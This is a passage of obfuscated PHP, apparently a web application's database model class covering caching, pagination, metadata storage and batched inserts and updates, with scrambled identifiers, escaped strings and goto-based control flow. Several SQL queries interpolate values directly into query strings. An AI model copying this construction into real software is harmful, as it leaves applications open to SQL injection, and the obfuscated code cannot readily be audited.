$this->query("\x73\150\x6f\x77\40\164\x61\142\x6c\145\40\x73\164\141\x74\x75\x73\40\167\150\x65\162\x65\40\116\x61\155\145\75\47{$dÚ¯ô»∑‚¨}\x27"); $fòÉé©Öä = $aÒò”∆˜ñ«[0][$_SERVER[ú∫][358]]; $eá◊Ç©û˜ˆ = max($eü§ì¿Ñ…Ω, $fòÉé©Öä); return $eá◊Ç©û˜ˆ; } protected function _callBefore($dâõàá›èæ, $CûÂÜÉ√·ø) { return $this->cacheCallCheck($dâõàá›èæ, $CûÂÜÉ√·ø, !1); } protected function _callAfter($eÂ≤„ã≥´†, $CÜπÏ›◊Íà) { return $this->cacheCallCheck($eÂ≤„ã≥´†, $CÜπÏ›◊Íà, !0); } protected function cacheFunctionAlias($D¡ôÊâÁé‘) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($aÓ”≠ñ¬”¡, $bÉáëÉÇÀÚ, $c·Û»√ÈÆÛ = false) { $CçÖÎé¿á± = $this->cacheFunctionAlias($bÉáëÉÇÀÚ); if (!$CçÖÎé¿á±) { return; } foreach ($CçÖÎé¿á± as $C¡€™äê¶ò => $f»î∏âñÎâ) { $B∫«åö«Áã = $f»î∏âñÎâ[0]; $dÉŒËﬁŒŸ— = explode($_SERVER[ú∫][47], $f»î∏âñÎâ[1]); if ($aÓ”≠ñ¬”¡ == $C¡€™äê¶ò) { return $this->cacheFunctionGet($C¡€™äê¶ò, $B∫«åö«Áã); } if ($c·Û»√ÈÆÛ && in_array($aÓ”≠ñ¬”¡, $dÉŒËﬁŒŸ—)) { $this->cacheFunctionClear($C¡€™äê¶ò, $B∫«åö«Áã); } } } public function cacheFunctionGet($aò≈äâ™Î∞, $eû¡£∫Ç—ë) { $Aï©âÙ¯ôä = $this->cacheKeyMake($aò≈äâ™Î∞, $eû¡£∫Ç—ë); $Eòﬂ‡Üêàâ = Cache::get($Aï©âÙ¯ôä); if (!is_array($Eòﬂ‡Üêàâ)) { $Eòﬂ‡Üêàâ = call_user_func_array(array($this, $aò≈äâ™Î∞), array($eû¡£∫Ç—ë, !0)); Cache::set($Aï©âÙ¯ôä, $Eòﬂ‡Üêàâ); } return $Eòﬂ‡Üêàâ; } public function cacheFunctionClear($F‡≤≤‘ıâ˘, $bã∆ÂÖ¡Éî) { $CŸ◊ﬁΩªñﬂ = $bã∆ÂÖ¡Éî; if (!is_array($bã∆ÂÖ¡Éî)) { $CŸ◊ﬁΩªñﬂ = array($bã∆ÂÖ¡Éî); } foreach ($CŸ◊ﬁΩªñﬂ as $eÚ¯¬Œ¢€) { $CöÜÊµ¶ñê = $this->cacheKeyMake($F‡≤≤‘ıâ˘, $eÚ¯¬Œ¢€); Cache::remove($CöÜÊµ¶ñê); } } private function cacheKeyMake($F°ù®éÃ≈ì, $fÊ·àù≤ç’) { $B”‹Õ∫ÎûÑ =& $_SERVER[ú∫]; return get_class($this) . $B”‹Õ∫ÎûÑ[71] . $F°ù®éÃ≈ì . $B”‹Õ∫ÎûÑ[359] . $fÊ·àù≤ç’; } protected function selectPageReset() { $F∞Ïé…€¡´ =& $_SERVER[ú∫]; if (isset($GLOBALS[$F∞Ïé…€¡´[360]])) { return; } $GLOBALS[$F∞Ïé…€¡´[360]] = isset($GLOBALS[$F∞Ïé…€¡´[7]][$F∞Ïé…€¡´[361]]) ? $GLOBALS[$F∞Ïé…€¡´[7]][$F∞Ïé…€¡´[361]] : !1; $GLOBALS[$F∞Ïé…€¡´[362]] = isset($GLOBALS[$F∞Ïé…€¡´[7]][$F∞Ïé…€¡´[351]]) ? $GLOBALS[$F∞Ïé…€¡´[7]][$F∞Ïé…€¡´[351]] : !1; $GLOBALS[$F∞Ïé…€¡´[7]][$F∞Ïé…€¡´[361]] = !1; $GLOBALS[$F∞Ïé…€¡´[7]][$F∞Ïé…€¡´[351]] = !1; } protected function selectPageRestore() { $aûúàÁ€√ƒ =& $_SERVER[ú∫]; if (!isset($GLOBALS[$aûúàÁ€√ƒ[360]])) { return; } $GLOBALS[$aûúàÁ€√ƒ[7]][$aûúàÁ€√ƒ[361]] = $GLOBALS[$aûúàÁ€√ƒ[360]]; $GLOBALS[$aûúàÁ€√ƒ[7]][$aûúàÁ€√ƒ[351]] = $GLOBALS[$aûúàÁ€√ƒ[362]]; unset($GLOBALS[$aûúàÁ€√ƒ[360]]); unset($GLOBALS[$aûúàÁ€√ƒ[362]]); } protected function selectPage($c∑î¨ı ≥¡ = 200, $A∞üµÆ¿Ø¶ = 1) { goto b—Æ⁄ì√ÎÜ; AÍ≠ÿ⁄Èô: if (!is_array($c¯∂ﬂ∂πáç)) { $c¯∂ﬂ∂πáç = array(); } if ($eÉå“€âÀÇ == 1) { $CÖ‹‹ı„à· = count($c¯∂ﬂ∂πáç); } $F¢ﬂﬂÏ√è» = array($F‘Ùò∂È Á[364] => array($F‘Ùò∂È Á[365] => $CÖ‹‹ı„à·, $F‘Ùò∂È Á[361] => $c∑î¨ı ≥¡, $F‘Ùò∂È Á[351] => $A∞üµÆ¿Ø¶, $F‘Ùò∂È Á[366] => $eÉå“€âÀÇ), $F‘Ùò∂È Á[367] => $c¯∂ﬂ∂πáç); goto B£’“Í∞Áä; aÆª°∫Ñﬂ√: $c∑î¨ı ≥¡ = $c∑î¨ı ≥¡ <= 5 ? 5 : ($c∑î¨ı ≥¡ >= $FÁÚâÃ¶ÜÏ ? $FÁÚâÃ¶ÜÏ : $c∑î¨ı ≥¡); $A∞üµÆ¿Ø¶ = intval(isset($in[$F‘Ùò∂È Á[351]]) && $in[$F‘Ùò∂È Á[351]] ? $in[$F‘Ùò∂È Á[351]] : $A∞üµÆ¿Ø¶); $A∞üµÆ¿Ø¶ = $A∞üµÆ¿Ø¶ <= 1 ? 1 : $A∞üµÆ¿Ø¶; goto d©‰ÚÑ∂€¨; d©‰ÚÑ∂€¨: $c¯∂ﬂ∂πáç = array(); $e°Û”ÙÜ≈™ = 1; if ($A∞üµÆ¿Ø¶ == 1 && $e°Û”ÙÜ≈™) { $this->optionsValue($EØßÈùµºÉ); $c¯∂ﬂ∂πáç = $this->page($A∞üµÆ¿Ø¶, $c∑î¨ı ≥¡)->select(); $CÖ‹‹ı„à· = is_array($c¯∂ﬂ∂πáç) ? count($c¯∂ﬂ∂πáç) : 0; if ($CÖ‹‹ı„à· < $c∑î¨ı ≥¡) { $eÉå“€âÀÇ = 1; } else { $this->optionsValue($BäÉÿ’ôèÉ); $CÖ‹‹ı„à· = intval($this->count()); $eÉå“€âÀÇ = ceil($CÖ‹‹ı„à· / $c∑î¨ı ≥¡); } } else { $this->optionsValue($BäÉÿ’ôèÉ); $CÖ‹‹ı„à· = intval($this->count()); $eÉå“€âÀÇ = ceil($CÖ‹‹ı„à· / $c∑î¨ı ≥¡); $A∞üµÆ¿Ø¶ = $A∞üµÆ¿Ø¶ >= $eÉå“€âÀÇ ? $eÉå“€âÀÇ : $A∞üµÆ¿Ø¶; $this->optionsValue($EØßÈùµºÉ); $c¯∂ﬂ∂πáç = $this->page($A∞üµÆ¿Ø¶, $c∑î¨ı ≥¡)->select(); } goto AÍ≠ÿ⁄Èô; bÓ±Â√üÚı: $BäÉÿ’ôèÉ = $EØßÈùµºÉ; $BäÉÿ’ôèÉ[$F‘Ùò∂È Á[363]] = array(); $c∑î¨ı ≥¡ = intval($c∑î¨ı ≥¡); goto aÆª°∫Ñﬂ√; b—Æ⁄ì√ÎÜ: $F‘Ùò∂È Á =& $_SERVER[ú∫]; global $in; $EØßÈùµºÉ = $this->optionsValue(); goto C¶¢çåßŸπ; C¶¢çåßŸπ: $FÁÚâÃ¶ÜÏ = 50000; $c∑î¨ı ≥¡ = isset($in[$F‘Ùò∂È Á[361]]) && $in[$F‘Ùò∂È Á[361]] ? $in[$F‘Ùò∂È Á[361]] : $c∑î¨ı ≥¡; if ($c∑î¨ı ≥¡ === -1) { $in[$F‘Ùò∂È Á[361]] = !1; $FÁÚâÃ¶ÜÏ = 100000000; $c∑î¨ı ≥¡ = $FÁÚâÃ¶ÜÏ; } goto bÓ±Â√üÚı; B£’“Í∞Áä: return $F¢ﬂﬂÏ√è»; goto d…¢éﬁ˘àå; d…¢éﬁ˘àå: } protected function checkLength($c∞´«ñƒ∏Æ, $AÈÎ„ÊåÑ  = 0, $CÛ¿”ﬂƒ∞Ö = '') { $cµ≥√πï•í =& $_SERVER[ú∫]; $AÈÎ„ÊåÑ  = $AÈÎ„ÊåÑ  ? $AÈÎ„ÊåÑ  : 65536; if (!$c∞´«ñƒ∏Æ || strlen($c∞´«ñƒ∏Æ) < $AÈÎ„ÊåÑ ) { return; } $CÛ¿”ﬂƒ∞Ö = $CÛ¿”ﬂƒ∞Ö ? $CÛ¿”ﬂƒ∞Ö . $cµ≥√πï•í[68] : $cµ≥√πï•í[33]; show_json($CÛ¿”ﬂƒ∞Ö . LNG($cµ≥√πï•í[368]) . "\50{$AÈÎ„ÊåÑ }\x29", !1); } protected function metaSet($fà‘Ëçˆ®«, $B”äı÷≈†ò = null, $fí◊⁄Ö∆˜û = null) { goto EÍªêÁºÑæ; dçíÙÇ•ÆÜ: if (is_string($B”äı÷≈†ò)) { $A∆ñ€Ûñ≤°[$B”äı÷≈†ò] = $fí◊⁄Ö∆˜û; } $CËÎ≈≤Ω¢Ø = array(); foreach ($A∆ñ€Ûñ≤° as $c“–≤ÌÁ•ﬁ => $aè≠£ßÉé¿) { $this->checkLength($aè≠£ßÉé¿, !1, $a‰ÜÑì◊¥¿ . $f¿‰Àáÿûã[4] . $c“–≤ÌÁ•ﬁ); $CËÎ≈≤Ω¢Ø[] = array($F ãøÓúÍô => $fà‘Ëçˆ®«, $f¿‰Àáÿûã[93] => $c“–≤ÌÁ•ﬁ, $f¿‰Àáÿûã[372] => $aè≠£ßÉé¿); } goto Eô¶á˘…èÀ; Eô¶á˘…èÀ: $c∫âö…ÚÃÏ = $f¿‰Àáÿûã[373] . $this->tableMeta; CacheLock::lock($c∫âö…ÚÃÏ); $A†äß÷§√È->where(array($F ãøÓúÍô => $fà‘Ëçˆ®«))->addAll($CËÎ≈≤Ω¢Ø, array(), !0); goto C†ü≥Ω”÷ñ; fùªÑÌ≥¯É: $a‰ÜÑì◊¥¿ = $this->tableMeta[$f¿‰Àáÿûã[370]]; $A†äß÷§√È = Model($a‰ÜÑì◊¥¿); $B––‰ë˜ﬂ√ = array($F ãøÓúÍô => $fà‘Ëçˆ®«, $f¿‰Àáÿûã[371] => $B”äı÷≈†ò); goto d»¿î€âÎ ; EÍªêÁºÑæ: $f¿‰Àáÿûã =& $_SERVER[ú∫]; if (!$this->tableMeta || !$fà‘Ëçˆ®«) { return !1; } $F ãøÓúÍô = $this->tableMeta[$f¿‰Àáÿûã[369]]; goto fùªÑÌ≥¯É; C†ü≥Ω”÷ñ: CacheLock::unlock($c∫âö…ÚÃÏ); return !0; goto eÇèçø‘Œ€; d»¿î€âÎ : if (is_null($B”äı÷≈†ò)) { return $A†äß÷§√È->where(array($F ãøÓúÍô => $fà‘Ëçˆ®«))->delete(); } if (is_null($fí◊⁄Ö∆˜û) && is_string($B”äı÷≈†ò)) { return $A†äß÷§√È->where($B––‰ë˜ﬂ√)->delete(); } $A∆ñ€Ûñ≤° = is_array($B”äı÷≈†ò) ? $B”äı÷≈†ò : array(); goto dçíÙÇ•ÆÜ; eÇèçø‘Œ€: } public function metaGet($E›ˆÇ∆ÉæÀ, $BÑºï—∫Ö◊ = false) { goto d∫ƒ¿è≠ÖÀ; d∫ƒ¿è≠ÖÀ: $Cõ‚÷”•Óâ =& $_SERVER[ú∫]; if (!$this->tableMeta) { return array(); } $bÛÖÊÖﬁ≠∆ = $this->tableMeta[$Cõ‚÷”•Óâ[369]]; goto E∂ÁåÛÔΩ≠; E∂ÁåÛÔΩ≠: $e∫¶“æ¥é· = Model($this->tableMeta[$Cõ‚÷”•Óâ[370]]); if ($BÑºï—∫Ö◊) { $cê„—¢ÓÈö = array($bÛÖÊÖﬁ≠∆ => $E›ˆÇ∆ÉæÀ, $Cõ‚÷”•Óâ[93] => $BÑºï—∫Ö◊); return $e∫¶“æ¥é·->where($cê„—¢ÓÈö)->getField($Cõ‚÷”•Óâ[372]); } $cê„—¢ÓÈö = array($bÛÖÊÖﬁ≠∆ => $E›ˆÇ∆ÉæÀ); goto eõòçÔﬁª‰; eõòçÔﬁª‰: $dœ‹êâ›“‘ = $e∫¶“æ¥é·->field($Cõ‚÷”•Óâ[374])->where($cê„—¢ÓÈö)->select(); $dœ‹êâ›“‘ = array_to_keyvalue($dœ‹êâ›“‘, $Cõ‚÷”•Óâ[93], $Cõ‚÷”•Óâ[372]); return $dœ‹êâ›“‘; goto fÑƒ¶’´∏∏; fÑƒ¶’´∏∏: } private function checkDataAutoHas($b≥û˜Ø¿ì‡) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $dÆ“…≠ì«») { if (in_array($b≥û˜Ø¿ì‡, explode($_SERVER[ú∫][47], $dÆ“…≠ì«»[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Eç•ßó⁄Ô˜, $då”é°’¡≤) { $a˘‡ñ«ƒ›⁄ =& $_SERVER[ú∫]; foreach ($this->dataAuto as $eùﬁﬁ®©◊√) { $fÃ÷¯ßÊÉØ = $eùﬁﬁ®©◊√[0]; if (!in_array($då”é°’¡≤, explode($a˘‡ñ«ƒ›⁄[47], $eùﬁﬁ®©◊√[2]))) { continue; } switch (trim($eùﬁﬁ®©◊√[3])) { case $a˘‡ñ«ƒ›⁄[319]: case $a˘‡ñ«ƒ›⁄[320]: $f†Ö∑âº’” = $eùﬁﬁ®©◊√[1]; $BÑ⁄≥œ¢ïÙ = isset($eùﬁﬁ®©◊√[4]) ? (array) $eùﬁﬁ®©◊√[4] : array(); if ($f†Ö∑âº’” == $a˘‡ñ«ƒ›⁄[197] && array_key_exists($fÃ÷¯ßÊÉØ, $Eç•ßó⁄Ô˜)) { if (!$Eç•ßó⁄Ô˜[$fÃ÷¯ßÊÉØ]) { unset($Eç•ßó⁄Ô˜[$fÃ÷¯ßÊÉØ]); } break; } if (isset($Eç•ßó⁄Ô˜[$fÃ÷¯ßÊÉØ])) { array_unshift($BÑ⁄≥œ¢ïÙ, $Eç•ßó⁄Ô˜[$fÃ÷¯ßÊÉØ]); } if ($a˘‡ñ«ƒ›⁄[319] == $eùﬁﬁ®©◊√[3]) { $Eç•ßó⁄Ô˜[$fÃ÷¯ßÊÉØ] = call_user_func_array($f†Ö∑âº’”, $BÑ⁄≥œ¢ïÙ); } else { $Eç•ßó⁄Ô˜[$fÃ÷¯ßÊÉØ] = call_user_func_array(array(&$this, $f†Ö∑âº’”), $BÑ⁄≥œ¢ïÙ); } break; case $a˘‡ñ«ƒ›⁄[271]: $Eç•ßó⁄Ô˜[$fÃ÷¯ßÊÉØ] = $Eç•ßó⁄Ô˜[$eùﬁﬁ®©◊√[1]]; break; case $a˘‡ñ«ƒ›⁄[292]: if (isset($Eç•ßó⁄Ô˜[$fÃ÷¯ßÊÉØ]) && !is_string($Eç•ßó⁄Ô˜[$fÃ÷¯ßÊÉØ])) { $Eç•ßó⁄Ô˜[$fÃ÷¯ßÊÉØ] = json_encode_force($Eç•ßó⁄Ô˜[$fÃ÷¯ßÊÉØ]); } break; case $a˘‡ñ«ƒ›⁄[321]: if ($Eç•ßó⁄Ô˜[$fÃ÷¯ßÊÉØ] === $a˘‡ñ«ƒ›⁄[33]) { unset($Eç•ßó⁄Ô˜[$fÃ÷¯ßÊÉØ]); } break; case $a˘‡ñ«ƒ›⁄[322]: $Eç•ßó⁄Ô˜[$fÃ÷¯ßÊÉØ] = $eùﬁﬁ®©◊√[1]; default: break; } } if ($då”é°’¡≤ == $a˘‡ñ«ƒ›⁄[355]) { $E™”¶‹Ñ≠≥ = strtolower($this->db->getDbType()); if (strpos($E™”¶‹Ñ≠≥, $a˘‡ñ«ƒ›⁄[9]) !== 0) { return; } $bŒ‰ï«ÑÏ— = $this->field(!0)->fields; $CÈ±¶¯ÁÛé = $bŒ‰ï«ÑÏ—[$a˘‡ñ«ƒ›⁄[250]]; if (isset($bŒ‰ï«ÑÏ—[$a˘‡ñ«ƒ›⁄[249]])) { unset($CÈ±¶¯ÁÛé[$bŒ‰ï«ÑÏ—[$a˘‡ñ«ƒ›⁄[249]]]); } foreach ($CÈ±¶¯ÁÛé as $C§õ¶ÂÇ†Ç => $då”é°’¡≤) { if (!isset($Eç•ßó⁄Ô˜[$C§õ¶ÂÇ†Ç])) { $Eç•ßó⁄Ô˜[$C§õ¶ÂÇ†Ç] = $a˘‡ñ«ƒ›⁄[33]; } } } } private function dataAfterFilter(&$Dû›ûÆ“„») { $d≈ìã—±»œ =& $_SERVER[ú∫]; foreach ($this->dataAuto as $b±îé‹Ú∆®) { $Eá©“§”œõ = $b±îé‹Ú∆®[0]; if (!in_array($d≈ìã—±»œ[357], explode($d≈ìã—±»œ[47], $b±îé‹Ú∆®[2]))) { continue; } if (!isset($Dû›ûÆ“„»[$Eá©“§”œõ])) { continue; } switch (trim($b±îé‹Ú∆®[3])) { case $d≈ìã—±»œ[319]: case $d≈ìã—±»œ[320]: $fÉﬂ‚Ùõ•Û = isset($b±îé‹Ú∆®[4]) ? (array) $b±îé‹Ú∆®[4] : array(); array_unshift($fÉﬂ‚Ùõ•Û, $Dû›ûÆ“„»[$Eá©“§”œõ]); if ($d≈ìã—±»œ[319] == $b±îé‹Ú∆®[3]) { $Dû›ûÆ“„»[$Eá©“§”œõ] = call_user_func_array($b±îé‹Ú∆®[1], $fÉﬂ‚Ùõ•Û); } else { $Dû›ûÆ“„»[$Eá©“§”œõ] = call_user_func_array(array(&$this, $b±îé‹Ú∆®[1]), $fÉﬂ‚Ùõ•Û); } break; case $d≈ìã—±»œ[271]: $Dû›ûÆ“„»[$Eá©“§”œõ] = $Dû›ûÆ“„»[$b±îé‹Ú∆®[1]]; break; case $d≈ìã—±»œ[292]: $DÌùÕÚêéﬂ = $Dû›ûÆ“„»[$Eá©“§”œõ]; $Dû›ûÆ“„»[$Eá©“§”œõ] = json_decode($DÌùÕÚêéﬂ, !0); if (is_null($Dû›ûÆ“„»[$Eá©“§”œõ])) { $Dû›ûÆ“„»[$Eá©“§”œõ] = $DÌùÕÚêéﬂ; } break; case $d≈ìã—±»œ[321]: if ($Dû›ûÆ“„»[$Eá©“§”œõ] === $d≈ìã—±»œ[33]) { unset($Dû›ûÆ“„»[$Eá©“§”œõ]); } break; case $d≈ìã—±»œ[322]: $Dû›ûÆ“„»[$Eá©“§”œõ] = $b±îé‹Ú∆®[1]; default: break; } } } public function saveAll($fÚåÛåûÉë) { goto Aêﬁàë‡íÉ; DÜæ¬îªÖØ: $this->chunkEventSet(); goto fÓÎÈ≥à˘ä; Aêﬁàë‡íÉ: $f‡ÖÕ⁄£≤ì =& $_SERVER[ú∫]; $a— ¡±Îèˆ = $this->tablePrefix . $this->tableName; $CÒ¶„— ë¶ = self::SQL_WHERE_IN_CHUNK; goto dÒπ…∆ÌáÁ; dÒπ…∆ÌáÁ: $fÚåÛåûÉë = is_array($fÚåÛåûÉë) ? $fÚåÛåûÉë : array(); $a°ŒåòÃÑ¡ = $f‡ÖÕ⁄£≤ì[375]; $dÓ’…ö˘ÜÂ = 0; goto c®”£Æåöè; c®”£Æåöè: $eÁÆÍ«‚¬ª = array(); $D∂Æ£‡Ùü⁄ = count($fÚåÛåûÉë); for ($C≥¶∂’ëÓ≈ = 0; $C≥¶∂’ëÓ≈ < $D∂Æ£‡Ùü⁄; $C≥¶∂’ëÓ≈++) { $eË∫ü∏≈ÒÕ = $fÚåÛåûÉë[$C≥¶∂’ëÓ≈]; if (!is_array($eË∫ü∏≈ÒÕ) || count($eË∫ü∏≈ÒÕ) != 4) { continue; } $aú—’íè¯ã = "\x55\120\x44\101\x54\x45\40\x60{$a— ¡±Îèˆ}\x60\x20\123\x45\x54\x20{$eË∫ü∏≈ÒÕ[2]}\40\x3d\x20\103\x41\123\x45\x20{$eË∫ü∏≈ÒÕ[0]}\x20\12"; if ($dÓ’…ö˘ÜÂ == 0) { $a°ŒåòÃÑ¡ = $aú—’íè¯ã; } $eÁÆÍ«‚¬ª[] = $f‡ÖÕ⁄£≤ì[116] . $eË∫ü∏≈ÒÕ[1] . $f‡ÖÕ⁄£≤ì[116]; $dÓ’…ö˘ÜÂ++; $a°ŒåòÃÑ¡ .= "\x20\x57\110\105\x4e\40\47{$eË∫ü∏≈ÒÕ[1]}\47\x20\124\x48\105\x4e\40\x27{$eË∫ü∏≈ÒÕ[3]}\47\40\12"; if ($dÓ’…ö˘ÜÂ == $CÒ¶„— ë¶ || $C≥¶∂’ëÓ≈ == $D∂Æ£‡Ùü⁄ - 1) { goto a∫ŒöÙéêØ; a∫ŒöÙéêØ: $a≤ï£¯È†ÿ = implode($f‡ÖÕ⁄£≤ì[47], $eÁÆÍ«‚¬ª); $a°ŒåòÃÑ¡ .= "\x20\x45\x4e\104\x20\40\x57\110\105\x52\105\x20{$eË∫ü∏≈ÒÕ[0]}\x20\x49\x4e\x20\x28{$a≤ï£¯È†ÿ}\51\40"; $this->execute($a°ŒåòÃÑ¡); goto F ÿ÷Ωòø£; cÎ∑ª”É∑¶: $eÁÆÍ«‚¬ª = array(); goto e≤°Õ¯ÜÑﬁ; F ÿ÷Ωòø£: $dÓ’…ö˘ÜÂ = 0; $a°ŒåòÃÑ¡ = $aú—’íè¯ã; $this->chunkEventCheck(count($eÁÆÍ«‚¬ª)); goto cÎ∑ª”É∑¶; e≤°Õ¯ÜÑﬁ: } } goto DÜæ¬îªÖØ; fÓÎÈ≥à˘ä: } public function saveAllEach($c∫Ç¬¡ÇÏÆ) { $AÌ ÎÑ≤ñó =& $_SERVER[ú∫]; $fà≤∑ˆ££ï = $this->tablePrefix . $this->tableName; foreach ($c∫Ç¬¡ÇÏÆ as $F„É†˜Ù∫ê) { if (!is_array($F„É†˜Ù∫ê) || count($F„É†˜Ù∫ê) != 4) { continue; } $aπæÜÑÜ∏≤ = $F„É†˜Ù∫ê[0] . $AÌ ÎÑ≤ñó[376] . $F„É†˜Ù∫ê[1] . $AÌ ÎÑ≤ñó[116]; $fºâêΩ∆Êè = $F„É†˜Ù∫ê[2] . $AÌ ÎÑ≤ñó[376] . $F„É†˜Ù∫ê[3] . $AÌ ÎÑ≤ñó[116]; $A„ˆ§≠ËË = "\x75\160\x64\x61\x74\x65\40{$fà≤∑ˆ££ï}\40\x73\x65\164\x20{$fºâêΩ∆Êè}\40\167\150\x65\162\145\x20{$aπæÜÑÜ∏≤}\73"; $this->execute($A„ˆ§≠ËË); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($cèˆ ∆…®Ï = false, $fôÛé§‘îÈ = false) { $this->_chunkEvent = $cèˆ ∆…®Ï; $this->_chunkEventParam = $fôÛé§‘îÈ; } private function chunkEventCheck($dÜ…Ïõë¬É) { if (!$this->_chunkEvent) { return; } $FÕ√Ö≥£»◊ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $FÕ√Ö≥£»◊[$_SERVER[ú∫][377]] = $dÜ…Ïõë¬É; Hook::trigger($this->_chunkEvent, $FÕ√Ö≥£»◊); } public function addAll($Cßá¡Ã‹—Î, $aÀâÌÔï“è = array(), $D‘¡⁄≈◊•¨ = false) { goto Cùà»ø¨óÑ; Cùà»ø¨óÑ: $E„ÌÀÍ»¢√ =& $_SERVER[ú∫]; ignore_timeout(); $bØ±ãÑπùì = self::SQL_WHERE_IN_CHUNK; goto cﬂôõÌ“ßê; C’Âë§»åÔ: if (method_exists($this->db, $E„ÌÀÍ»¢√[270])) { for ($a∫é‡æÛò‚ = 0; $a∫é‡æÛò‚ < count($Cßá¡Ã‹—Î); $a∫é‡æÛò‚ += $bØ±ãÑπùì) { $dÀ≈ø…óÖΩ = array_slice($Cßá¡Ã‹—Î, $a∫é‡æÛò‚, $bØ±ãÑπùì); if (!is_array($dÀ≈ø…óÖΩ) || count($dÀ≈ø…óÖΩ) == 0) { break; } $Eèâ∏î¥⁄ = $this->db->insertAll($dÀ≈ø…óÖΩ, $aÀâÌÔï“è, $D‘¡⁄≈◊•¨); $this->chunkEventCheck(count($dÀ≈ø…óÖΩ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Cßá¡Ã‹—Î as $bí∞Ç™‚“∑ => $F≥√–∏Ó¿˜) { $Eèâ∏î¥⁄ = $this->db->insert($F≥√–∏Ó¿˜, $aÀâÌÔï“è, $D‘¡⁄≈◊•¨); } $this->commit(); } if (!1 !== $Eèâ∏î¥⁄) { $cçúçΩÉ±§ = $this->getLastInsID(); if ($cçúçΩÉ±§) { return $cçúçΩÉ±§; } } return $Eèâ∏î¥⁄; goto c‰‚é‹ìûá; cﬂôõÌ“ßê: if (empty($Cßá¡Ã‹—Î)) { $this->error = think_lang($E„ÌÀÍ»¢√[269]); return !1; } $aÀâÌÔï“è = $this->_parseOptions($aÀâÌÔï“è); foreach ($Cßá¡Ã‹—Î as $bí∞Ç™‚“∑ => $F≥√–∏Ó¿˜) { $Cßá¡Ã‹—Î[$bí∞Ç™‚“∑] = $this->_facade($F≥√–∏Ó¿˜); $this->_beforeInsert($Cßá¡Ã‹—Î[$bí∞Ç™‚“∑], $aÀâÌÔï“è); } goto C’Âë§»åÔ; c‰‚é‹ìûá: } public function save($B¨ë∂Ÿ¢∫• = '', $aø®ßΩº Ø = array()) { goto EÁ¬Õ€ΩòŸ; EÁ¬Õ€ΩòŸ: $C†©Ò–ì…Œ =& $_SERVER[ú∫]; $bà≤†ÊΩúå = self::SQL_WHERE_IN_CHUNK; $a¬˘∏âµìÇ = $this->optionsValue(); goto DπŸé’ïﬁ«; F¿∫⁄é±⁄¥: $b“√Àà„÷ú = $a¬˘∏âµìÇ[$C†©Ò–ì…Œ[273]][$DØΩ“¥é†Î][1]; $b“√Àà„÷ú = is_array($b“√Àà„÷ú) ? $b“√Àà„÷ú : array(); $aØ∑†‚≈∂‘ = count($b“√Àà„÷ú); goto BŒ‚–≈ÛÇÒ; BŒ‚–≈ÛÇÒ: for ($cäàÎ¢Ø’Ê = 0; $cäàÎ¢Ø’Ê < $aØ∑†‚≈∂‘; $cäàÎ¢Ø’Ê += $bà≤†ÊΩúå) { $fﬁêÇ≤∑—Õ = array_slice($b“√Àà„÷ú, $cäàÎ¢Ø’Ê, $bà≤†ÊΩúå); if (!is_array($fﬁêÇ≤∑—Õ) || count($fﬁêÇ≤∑—Õ) == 0) { break; } $a¬˘∏âµìÇ[$C†©Ò–ì…Œ[273]][$DØΩ“¥é†Î][1] = $fﬁêÇ≤∑—Õ; $this->optionsValue($a¬˘∏âµìÇ); $b¨Ó˜œ–¯µ += parent::save($B¨ë∂Ÿ¢∫•, $aø®ßΩº Ø); $this->chunkEventCheck(count($fﬁêÇ≤∑—Õ)); } $this->chunkEventSet(); return $b¨Ó˜œ–¯µ; goto FóıûªΩ ê; DπŸé’ïﬁ«: $DØΩ“¥é†Î = $this->findWhereField($a¬˘∏âµìÇ); if (!$DØΩ“¥é†Î) { return parent::save($B¨ë∂Ÿ¢∫•, $aø®ßΩº Ø); } $b¨Ó˜œ–¯µ = 0; goto F¿∫⁄é±⁄¥; FóıûªΩ ê: } public function add($fªÇﬁøéÙ› = '', $D¯´∫â¢ïæ = array(), $eâ¢Ò¨ÛåÌ = false) { if ($this->addTaskStatus && is_array($fªÇﬁøéÙ›)) { $this->addTaskData[] = $fªÇﬁøéÙ›; return; } return parent::add($fªÇﬁøéÙ›, $D¯´∫â¢ïæ, $eâ¢Ò¨ÛåÌ); } public function parseWhereLike($AÖ™• ‘ﬂã, $A©úË≥øÊ¨ = '', $c®í—≥ÇÑŒ = false, &$BÇ∫¿ßØ˘è = false) { goto d«äÉìÜ´é; d«äÉìÜ´é: $F¥•⁄úÒ¥õ =& $_SERVER[ú∫]; $d∆úŒ£Î°ö = $GLOBALS[$F¥•⁄úÒ¥õ[6]][$F¥•⁄úÒ¥õ[378]]; if (!$d∆úŒ£Î°ö[$F¥•⁄úÒ¥õ[379]]) { return $AÖ™• ‘ﬂã; } goto aå¢ÉÑÔ≈È; aå¢ÉÑÔ≈È: if (!is_array($AÖ™• ‘ﬂã)) { return $AÖ™• ‘ﬂã; } $DµπÇíàÔ¬ = array(); $aãïòãàÌ≈ = 0; goto C±Áåò∑îä; C±Áåò∑îä: foreach ($AÖ™• ‘ﬂã as $fÇˆË÷·ﬁÎ => $B∞∏“„ÀÑ) { if (is_array($B∞∏“„ÀÑ) && count($B∞∏“„ÀÑ) == 2 && $B∞∏“„ÀÑ[0] == $F¥•⁄úÒ¥õ[380] && is_string($B∞∏“„ÀÑ[1]) && substr($B∞∏“„ÀÑ[1], 0, 1) == $F¥•⁄úÒ¥õ[381] && substr($B∞∏“„ÀÑ[1], strlen($B∞∏“„ÀÑ[1]) - 1, 1) == $F¥•⁄úÒ¥õ[381]) { goto aÕÏó°∆≈◊; eˆœÚÚı◊Ö: if ($d∆úŒ£Î°ö[$F¥•⁄úÒ¥õ[383]]) { $fﬁü™ÌæïØ = $F¥•⁄úÒ¥õ[384] . $aÉÌÙ∞Ç≠Ö . $F¥•⁄úÒ¥õ[385]; if ($d∆úŒ£Î°ö[$F¥•⁄úÒ¥õ[386]]) { $fﬁü™ÌæïØ = $F¥•⁄úÒ¥õ[385] . $aÉÌÙ∞Ç≠Ö . $F¥•⁄úÒ¥õ[384]; } } $DµπÇíàÔ¬[$aãïòãàÌ≈] = $F¥•⁄úÒ¥õ[387] . $DÚ’ó»∂¨≠ . $F¥•⁄úÒ¥õ[388] . $fﬁü™ÌæïØ . $F¥•⁄úÒ¥õ[389]; 